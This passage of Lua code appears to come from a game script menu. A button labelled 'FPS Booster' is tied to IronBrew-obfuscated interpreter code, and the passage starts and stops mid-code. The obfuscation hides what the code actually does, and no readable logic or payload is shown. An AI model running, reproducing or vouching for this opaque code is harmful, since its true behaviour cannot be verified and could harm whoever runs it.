IIIlllIllIIlllII=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("yqO")]];lIlIIIIlIIIlIIIIIllIl[IIIIllII+1]=IIIlllIllIIlllII;lIlIIIIlIIIlIIIIIllIl[IIIIllII]=IIIlllIllIIlllII[lIlIIIllIllll[#("fHtW")]];else local lIlIIIllIllll=lIlIIIllIllll[#("SS")]lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll](lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll+1])end;elseif IIIlllIllIIlllII<=#("0VPgYEoZYNjLVgFNYCBij8Y6")then local IIIIllII=lIlIIIllIllll[#("6J")];local IIIlllIllIIlllII=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("33J")]];lIlIIIIlIIIlIIIIIllIl[IIIIllII+1]=IIIlllIllIIlllII;lIlIIIIlIIIlIIIIIllIl[IIIIllII]=IIIlllIllIIlllII[lIlIIIllIllll[#("OzYZ")]];elseif IIIlllIllIIlllII>#("sRx5c6kla8dNpjpqHzN8qQKPA")then IIIIllII=lIlIIIllIllll[#("D6R")];else if not lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("EU")]]then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#("O3T")];end;end;elseif IIIlllIllIIlllII<=#("YhOb26SjGW13WQ9AViB9Jsl2MKk7QMg")then if IIIlllIllIIlllII<=#("FihdI9fg5fNDzNN6915CnAuF6Vzs")then if IIIlllIllIIlllII>#("UE4QjzNJ61VcueDQSD96o8YQPEe")then local IIIIllII=lIlIIIllIllll[#("P8")]lIlIIIIlIIIlIIIIIllIl[IIIIllII]=lIlIIIIlIIIlIIIIIllIl[IIIIllII](IIllIllIlllIllIlIlIIII(lIlIIIIlIIIlIIIIIllIl,IIIIllII+1,lIlIIIllIllll[#("goH")]))else lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("xu")]]=IlIlllIIIlllllII[lIlIIIllIllll[#("a8f")]];end;elseif IIIlllIllIIlllII<=#("MhWLXukLTXoo9yd9jz3v2ZnszvHWP")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("ku")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("zSA")]][lIlIIIllIllll[#("lY6j")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Dm")]]=IlIlllIIIlllllII[lIlIIIllIllll[#("5Ad")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("fv")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("SgG")]][lIlIIIllIllll[#("tVHo")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("XG")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("7pK")]][lIlIIIllIllll[#("HlnJ")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];if(lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("rg")]]==lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("jjUX")]])then IIIIllII=IIIIllII+1;else IIIIllII=lIlIIIllIllll[#("QZW")];end;elseif IIIlllIllIIlllII==#("bQtZ6Zfko94165nV704ZGpKT5W3ElC")then IIIIllII=lIlIIIllIllll[#("ZhI")];else local IlIlllIIIlllllII;local IIIlllIllIIlllII;lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("2I")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("z1o")]][lIlIIIllIllll[#("mfZR")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];IIIlllIllIIlllII=lIlIIIllIllll[#("lR")];IlIlllIIIlllllII=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Ish")]];lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII+1]=IlIlllIIIlllllII;lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII]=IlIlllIIIlllllII[lIlIIIllIllll[#("J5Gq")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("cn")]]=lIllIlllIIIIlllI[lIlIIIllIllll[#("lHT")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Mn")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Dhz")]][lIlIIIllIllll[#("B1VI")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("uD")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#{{136;597;570;984};{62;194;244;493};{675;530;800;222};}]][lIlIIIllIllll[#("3UMS")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];IIIlllIllIIlllII=lIlIIIllIllll[#("8E")]lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII](IIllIllIlllIllIlIlIIII(lIlIIIIlIIIlIIIIIllIl,IIIlllIllIIlllII+1,lIlIIIllIllll[#("yA1")]))end;elseif IIIlllIllIIlllII<=#("y5GVI4jCo49k4Ba3reOyR20RWgL3j5L9X")then if IIIlllIllIIlllII>#("H6AkQ0XzQ4HeQs53MzHdgGfY9Ctprts9")then lIllIlllIIIIlllI[lIlIIIllIllll[#("Pm1")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("0x")]];else local IIIIllII=lIlIIIllIllll[#("T4")]lIlIIIIlIIIlIIIIIllIl[IIIIllII]=lIlIIIIlIIIlIIIIIllIl[IIIIllII](IIllIllIlllIllIlIlIIII(lIlIIIIlIIIlIIIIIllIl,IIIIllII+1,lIlIIIllIllll[#("lor")]))end;elseif IIIlllIllIIlllII<=#("S4eDhzXLsl5kRAs8qslCTea0MknHHgvLHS")then lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("oM")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("klb")]][lIlIIIllIllll[#("9oLH")]];elseif IIIlllIllIIlllII==#("y1AFaTDYtjOsbarbagINN3n16kqdl0tN9D4")then local IIIIllII=lIlIIIllIllll[#("oj")]lIlIIIIlIIIlIIIIIllIl[IIIIllII](IIllIllIlllIllIlIlIIII(lIlIIIIlIIIlIIIIIllIl,IIIIllII+1,lIlIIIllIllll[#{"1 + 1 = 111";{264;749;408;160};"1 + 1 = 111";}]))else local lIllIlllIIIIlllI;local IIIlllIllIIlllII;lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#{{915;414;988;355};"1 + 1 = 111";}]]=IlIlllIIIlllllII[lIlIIIllIllll[#("8gi")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("VW")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("Gz1")]][lIlIIIllIllll[#("4sVm")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("uk")]]=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("AT7")]][lIlIIIllIllll[#("EPaH")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];IIIlllIllIIlllII=lIlIIIllIllll[#("yh")];lIllIlllIIIIlllI=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("fb0")]];lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII+1]=lIllIlllIIIIlllI;lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII]=lIllIlllIIIIlllI[lIlIIIllIllll[#("f8o1")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];IIIlllIllIIlllII=lIlIIIllIllll[#("q1")]lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII]=lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII](lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII+1])IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("8V")]]=IlIlllIIIlllllII[lIlIIIllIllll[#("ayN")]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];IIIlllIllIIlllII=lIlIIIllIllll[#("7Y")];lIllIlllIIIIlllI=lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("B7o")]];lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII+1]=lIllIlllIIIIlllI;lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII]=lIllIlllIIIIlllI[lIlIIIllIllll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=lIlIIIllIllll[#("pD9")];IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];IIIlllIllIIlllII=lIlIIIllIllll[#("Jj")]lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII]=lIlIIIIlIIIlIIIIIllIl[IIIlllIllIIlllII](IIllIllIlllIllIlIlIIII(lIlIIIIlIIIlIIIIIllIl,IIIlllIllIIlllII+1,lIlIIIllIllll[#("fu1")]))IIIIllII=IIIIllII+1;lIlIIIllIllll=lIIlllIlIIIIIIIl[IIIIllII];lIlIIIIlIIIlIIIIIllIl[lIlIIIllIllll[#("96")]]=(lIlIIIllIllll[#("VNI")]~=0);end;IIIIllII=IIIIllII+1;end;end);end;return lIlIIlIIIIllI(true,{},IlIIllIlIlIlIlIII())();end)(string.byte,table.insert,setmetatable);
end)

e:Button("FPS Booster",function()
    --[[
IronBrew:tm: obfuscation; Version 2.7.2
]]
return(function(lIllIIll,lllIlIIIll,lllIlIIIll)local IlIlIIIllllIIl=string.char;local IIlllIlIIIIIlI=string.sub;local IlIIIllIllIIlllIII=table.concat;local llIllllIllIlIllllIlI=math.ldexp;local IIllIIIIIllIlI=getfenv or function()return _ENV end;local IllIIlIlIlIllIlIIII=select;local llIIllll=unpack or table.unpack;local lllIIlllIllI=tonumber;local function IIlIIIllllI(lIllIIll)local lIIIlIIllIllIll,IIIIllIIlllIIIIllIIII,lllIllIlllIllll="","",{}local lIlIIIlI=256;local IllllllIIlI={}for lllIlIIIll=0,lIlIIIlI-1 do IllllllIIlI[lllIlIIIll]=IlIlIIIllllIIl(lllIlIIIll)end;local lllIlIIIll=1;local function llIIllll()local lIIIlIIllIllIll=lllIIlllIllI(IIlllIlIIIIIlI(lIllIIll,lllIlIIIll,lllIlIIIll),36)lllIlIIIll=lllIlIIIll+1;local IIIIllIIlllIIIIllIIII=lllIIlllIllI(IIlllIlIIIIIlI(lIllIIll,lllIlIIIll,lllIlIIIll+lIIIlIIllIllIll-1),36)lllIlIIIll=lllIlIIIll+lIIIlIIllIllIll;return IIIIllIIlllIIIIllIIII end;lIIIlIIllIllIll=IlIlIIIllllIIl(llIIllll())lllIllIlllIllll[1]=lIIIlIIllIllIll;while lllIlIIIll<#lIllIIll do local lllIlIIIll=llIIllll()if IllllllIIlI[lllIlIIIll]then IIIIllIIlllIIIIllIIII=IllllllIIlI[lllIlIIIll]else IIIIllIIlllIIIIllIIII=lIIIlIIllIllIll..IIlllIlIIIIIlI(lIIIlIIllIllIll,1,1)end;IllllllIIlI[lIlIIIlI]=lIIIlIIllIllIll..IIlllIlIIIIIlI(IIIIllIIlllIIIIllIIII,1,1)lllIllIlllIllll[#lllIllIlllIllll+1],lIIIlIIllIllIll,lIlIIIlI=IIIIllIIlllIIIIllIIII,IIIIllIIlllIIIIllIIII,lIlIIIlI+1 end;return table.concat(lllIllIlllIllll)end;local lllIIlllIllI=IIlIIIlllllocal lllIlIIIll=(bit or bit32);local lIlIIIlI=lllIlIIIll and lllIlIIIll.bxor or function(lllIlIIIll,IIIIllIIlllIIIIllIIII)local lIIIlIIllIllIll,lIlIIIlI,IIlllIlIIIIIlI=1,0,10 while lllIlIIIll>0 and IIIIllIIlllIIIIllIIII>0 do local IIlllIlIIIIIlI,lllIllIlllIllll=lllIlIIIll%2,IIIIllIIlllIIIIllIIII%2 if IIlllIlIIIIIlI~=lllIllIlllIllll then lIlIIIlI=lIlIIIlI+lIIIlIIllIllIll end lllIlIIIll,IIIIllIIlllIIIIllIIII,lIIIlIIllIllIll=(lllIlIIIll-IIlllIlIIIIIlI)/2,(IIIIllIIlllIIIIllIIII-lllIllIlllIllll)/2,lIIIlIIllIllIll*2 end if lllIlIIIll<IIIIllIIlllIIIIllIIII then lllIlIIIll=IIIIllIIlllIIIIllIIII end while lllIlIIIll>0 do local IIIIllIIlllIIIIllIIII=lllIlIIIll%2 if IIIIllIIlllIIIIllIIII>0 then lIlIIIlI=lIlIIIlI+lIIIlIIllIllIll end lllIlIIIll,lIIIlIIllIllIll=(lllIlIIIll-IIIIllIIlllIIIIllIIII)/2,lIIIlIIllIllIll*2 end return lIlIIIlI end local function IIIIllIIlllIIIIllIIII(lIIIlIIllIllIll,lllIlIIIll,IIIIllIIlllIIIIllIIII)if IIIIllIIlllIIIIllIIII then local lllIlIIIll=(lIIIlIIllIllIll/2^(lllIlIIIll-1))%2^((IIIIllIIlllIIIIllIIII-1)-(lllIlIIIll-1)+1);return lllIlIIIll-lllIlIIIll%1;else local lllIlIIIll=2^(lllIlIIIll-1);return(lIIIlIIllIllIll%(lllIlIIIll+lllIlIIIll)>=lllIlIIIll)and 1 or 0;end;end;local lllIlIIIll=1;local function lIIIlIIllIllIll()local IIIIllIIlllIIIIllIIII,lIIIlIIllIllIll,IIlllIlIIIIIlI,lllIllIlllIllll=lIllIIll(lllIIlllIllI,lllIlIIIll,lllIlIIIll+3);IIIIllIIlllIIIIllIIII=lIlIIIlI(IIIIllIIlllIIIIllIIII,111)lIIIlIIllIllIll=lIlIIIlI(lIIIlIIllIllIll,111)IIlllIlIIIIIlI=lIlIIIlI(IIlllIlIIIIIlI,111)lllIllIlllIllll=lIlIIIlI(lllIllIlllIllll,111)lllIlIIIll=lllIlIIIll+4;return(lllIllIlllIllll*16777216)+(IIlllIlIIIIIlI*65536)+(lIIIlIIllIllIll*256)+IIIIllIIlllIIIIllIIII;end;local function IllllllIIlI()local lIIIlIIllIllIll=lIlIIIlI(lIllIIll(lllIIlllIllI,lllIlIIIll,lllIlIIIll),111);lllIlIIIll=lllIlIIIll+1;return lIIIlIIllIllIll;end;local function lllIllIlllIllll()local IIIIllIIlllIIIIllIIII,lIIIlIIllIllIll=lIllIIll(lllIIlllIllI,lllIlIIIll,lllIlIIIll+2);IIIIllIIlllIIIIllIIII=lIlIIIlI(IIIIllIIlllIIIIllIIII,111)lIIIlIIllIllIll=lIlIIIlI(lIIIlIIllIllIll,111)lllIlIIIll=lllIlIIIll+2;return(lIIIlIIllIllIll*256)+IIIIllIIlllIIIIllIIII;end;local function IIlIIIllllI()local lllIlIIIll=lIIIlIIllIllIll();local lIIIlIIllIllIll=lIIIlIIllIllIll();local IIlllIlIIIIIlI=1;local lIlIIIlI=(IIIIllIIlllIIIIllIIII(lIIIlIIllIllIll,1,20)*(2^32))+lllIlIIIll;local lllIlIIIll=IIIIllIIlllIIIIllIIII(lIIIlIIllIllIll,21,31);local lIIIlIIllIllIll=((-1)^IIIIllIIlllIIIIllIIII(lIIIlIIllIllIll,32));if(lllIlIIIll==0)then if(lIlIIIlI==0)then return lIIIlIIllIllIll*0;else lllIlIIIll=1;IIlllIlIIIIIlI=0;end;elseif(lllIlIIIll==2047)then return(lIlIIIlI==0)and(lIIIlIIllIllIll*(1/0))or(lIIIlIIllIllIll*(0/0));end;return llIllllIllIlIllllIlI(lIIIlIIllIllIll,lllIlIIIll-1023)*(IIlllIlIIIIIlI+(lIlIIIlI/(2^52)));end;local llIllllIllIlIllllIlI=lIIIlIIllIllIll;local function lIIlllIllIIIIIIllIIllIIlI(lIIIlIIllIllIll)local IIIIllIIlllIIIIllIIII;if(not lIIIlIIllIllIll)then lIIIlIIllIllIll=llIllllIllIlIllllIlI();if(lIIIlIIllIllIll==0)then return'';end;end;IIIIllIIlllIIIIllIIII=IIlllIlIIIIIlI(lllIIlllIllI,lllIlIIIll,lllIlIIIll+lIIIlIIllIllIll-1);lllIlIIIll=lllIlIIIll+lIIIlIIllIllIll;local lIIIlIIllIllIll={}for lllIlIIIll=1,#IIIIllIIlllIIIIllIIII do lIIIlIIllIllIll[lllIlIIIll]=IlIlIIIllllIIl(lIlIIIlI(lIllIIll(IIlllIlIIIIIlI(IIIIllIIlllIIIIllIIII,lllIlIIIll,lllIlIIIll)),111))end return IlIIIllIllIIlllIII(lIIIlIIllIllIll);end;local lllIlIIIll=lIIIlIIllIllIll;local function IlIIIllIllIIlllIII(...)return{...},IllIIlIlIlIllIlIIII('#',...)end local function IlIlIIIllllIIl()local lllIIlllIllI={};local lIlIIIlI={};local lllIlIIIll={};local lIllIIll={[#{"1 + 1 = 111";"1 + 1 = 111";}]=lIlIIIlI,[#{"1 + 1 = 111";{641;17;924;834};{492;284;755;162};}]=nil,[#{"1 + 1 = 111";{677;100;238;626};{386;273;491;903};{681;945;642;650};}]=lllIlIIIll,[#{{415;450;670;200};}]=lllIIlllIllI,};local lllIlIIIll=lIIIlIIllIllIll()local IIlllIlIIIIIlI={}for IIIIllIIlllIIIIllIIII=1,lllIlIIIll do local lIIIlIIllIllIll=IllllllIIlI();local lllIlIIIll;if(lIIIlIIllIllIll==0)then lllIlIIIll=(IllllllIIlI()~=0);elseif(lIIIlIIllIllIll==2)then lllIlIIIll=IIlIIIllllI();elseif(lIIIlIIllIllIll==3)then lllIlIIIll=lIIlllIllIIIIIIllIIllIIlI();end;IIlllIlIIIIIlI[IIIIllIIlllIIIIllIIII]=lllIlIIIll;end;lIllIIll[3]=IllllllIIlI();for lllIlIIIll=1,lIIIlIIllIllIll()do lIlIIIlI[lllIlIIIll-1]=IlIlIIIllllIIl();end;for lIllIIll=1,lIIIlIIllIllIll()do local lllIlIIIll=IllllllIIlI();if(IIIIllIIlllIIIIllIIII(lllIlIIIll,1,1)==0)then local lIlIIIlI=IIIIllIIlllIIIIllIIII(lllIlIIIll,2,3);local IllllllIIlI=IIIIllIIlllIIIIllIIII(lllIlIIIll,4,6);local lllIlIIIll={lllIllIlllIllll(),lllIllIlllIllll(),nil,nil};if(lIlIIIlI==0)then lllIlIIIll[#("srj")]=lllIllIlllIllll();lllIlIIIll[#("uVTC")]=lllIllIlllIllll();elseif(lIlIIIlI==1)then lllIlIIIll[#{"1 + 1 = 111";{470;660;164;916};"1 + 1 = 111";}]=lIIIlIIllIllIll();elseif(lIlIIIlI==2)then lllIlIIIll[#("vPG")]=lIIIlIIllIllIll()-(2^16)elseif(lIlIIIlI==3)then lllIlIIIll[#("cCs")]=lIIIlIIllIllIll()-(2^16)lllIlIIIll[#("q4vR")]=lllIllIlllIllll();end;if(IIIIllIIlllIIIIllIIII(IllllllIIlI,1,1)==1)then lllIlIIIll[#("ID")]=IIlllIlIIIIIlI[lllIlIIIll[#("vn")]]end if(IIIIllIIlllIIIIllIIII(IllllllIIlI,2,2)==1)then lllIlIIIll[#("1bt")]=IIlllIlIIIIIlI[lllIlIIIll[#("eK0")]]end if(IIIIllIIlllIIIIllIIII(IllllllIIlI,3,3)==1)then lllIlIIIll[#("8hyf")]=IIlllIlIIIIIlI[lllIlIIIll[#{{234;812;971;639};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]]end lllIIlllIllI[lIllIIll]=lllIlIIIll;end end;return lIllIIll;end;local function IllllllIIlI(lllIlIIIll,lIIIlIIllIllIll,lllIllIlllIllll)lllIlIIIll=(lllIlIIIll==true and IlIlIIIllllIIl())or lllIlIIIll;return(function(...)local lIlIIIlI=lllIlIIIll[1];local IIlllIlIIIIIlI=lllIlIIIll[3];local IlIlIIIllllIIl=lllIlIIIll[2];local lllIlIIIll=IlIIIllIllIIlllIII local lIIIlIIllIllIll=1;local lllIlIIIll=-1;local IIlIIIllllI={};local lllIIlllIllI={...};local lIllIIll=IllIIlIlIlIllIlIIII('#',...)-1;local lllIlIIIll={};local IIIIllIIlllIIIIllIIII={};for lllIlIIIll=0,lIllIIll do if(lllIlIIIll>=IIlllIlIIIIIlI)then IIlIIIllllI[lllIlIIIll-IIlllIlIIIIIlI]=lllIIlllIllI[lllIlIIIll+1];else IIIIllIIlllIIIIllIIII[lllIlIIIll]=lllIIlllIllI[lllIlIIIll+#{{141;921;980;783};}];end;end;local lllIlIIIll=lIllIIll-IIlllIlIIIIIlI+1 local lllIlIIIll;local IIlllIlIIIIIlI;while true do lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIlllIlIIIIIlI=lllIlIIIll[#("E")];if IIlllIlIIIIIlI<=#("biP4HNihvlEpBHs1")then if IIlllIlIIIIIlI<=#("mv0qBx7")then if IIlllIlIIIIIlI<=#("7p2")then if IIlllIlIIIIIlI<=#("g")then if IIlllIlIIIIIlI==#{}then if IIIIllIIlllIIIIllIIII[lllIlIIIll[#{{945;149;924;400};"1 + 1 = 111";}]]then lIIIlIIllIllIll=lIIIlIIllIllIll+1;else lIIIlIIllIllIll=lllIlIIIll[#("p4R")];end;else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("NW")]]={};end;elseif IIlllIlIIIIIlI>#("C3")then local lIIIlIIllIllIll=lllIlIIIll[#("pb")];local lIlIIIlI=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Afh")]];IIIIllIIlllIIIIllIIII[lIIIlIIllIllIll+1]=lIlIIIlI;IIIIllIIlllIIIIllIIII[lIIIlIIllIllIll]=lIlIIIlI[lllIlIIIll[#("t5mc")]];else if IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Pi")]]then lIIIlIIllIllIll=lIIIlIIllIllIll+1;else lIIIlIIllIllIll=lllIlIIIll[#("29I")];end;end;elseif IIlllIlIIIIIlI<=#("2jyZX")then if IIlllIlIIIIIlI==#("ru4Q")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("T4")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("NXz")]][lllIlIIIll[#("gPVU")]];else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("aM")]][lllIlIIIll[#("oV1")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("nY0l")]];end;elseif IIlllIlIIIIIlI==#("7EUSoD")then do return end;else IIIIllIIlllIIIIllIIII[lllIlIIIll[#("DZ")]]=lllIlIIIll[#("bvb")];end;elseif IIlllIlIIIIIlI<=#("gqKVSLJypNo")then if IIlllIlIIIIIlI<=#("qXHIARixI")then if IIlllIlIIIIIlI==#("9gDqPaVi")then IIIIllIIlllIIIIllIIII[lllIlIIIll[#("MG")]]=lllIllIlllIllll[lllIlIIIll[#("tvr")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("h1")]]=lllIllIlllIllll[lllIlIIIll[#("8gO")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("nm")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("BSV")]][lllIlIIIll[#("dSJJ")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("zg")]][lllIlIIIll[#("9vE")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("xJvT")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("kH")]]=lllIllIlllIllll[lllIlIIIll[#("HdR")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("iZ")]]=lllIllIlllIllll[lllIlIIIll[#{{990;803;98;441};"1 + 1 = 111";{606;979;382;641};}]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("6n")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#{"1 + 1 = 111";{947;114;238;743};"1 + 1 = 111";}]][lllIlIIIll[#("S1aA")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("q4")]][lllIlIIIll[#("TcA")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("UMXj")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("qP")]]=lllIllIlllIllll[lllIlIIIll[#("3tQ")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("jI")]]=lllIllIlllIllll[lllIlIIIll[#{{961;18;338;678};"1 + 1 = 111";"1 + 1 = 111";}]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("W2")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("uZt")]][lllIlIIIll[#("AJQI")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("uE")]][lllIlIIIll[#("cXD")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("MiMU")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("AF")]]=lllIllIlllIllll[lllIlIIIll[#("rKq")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("9c")]]=lllIllIlllIllll[lllIlIIIll[#("O7E")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("xq")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Jni")]][lllIlIIIll[#("kqlh")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#{{862;469;462;886};"1 + 1 = 111";}]][lllIlIIIll[#("Lv9")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("8M4T")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("k1")]]=lllIllIlllIllll[lllIlIIIll[#("r1S")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("jH")]]=lllIllIlllIllll[lllIlIIIll[#("QAD")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("Yv")]]=IIIIllIIlllIIIIllIIII[lllIlIIIll[#("K6T")]][lllIlIIIll[#("VJD6")]];lIIIlIIllIllIll=lIIIlIIllIllIll+1;lllIlIIIll=lIlIIIlI[lIIIlIIllIllIll];IIIIllIIlllIIIIllIIII[lllIlIIIll[#("c1")]][lllIlIIIll[#{"1 + 1 = 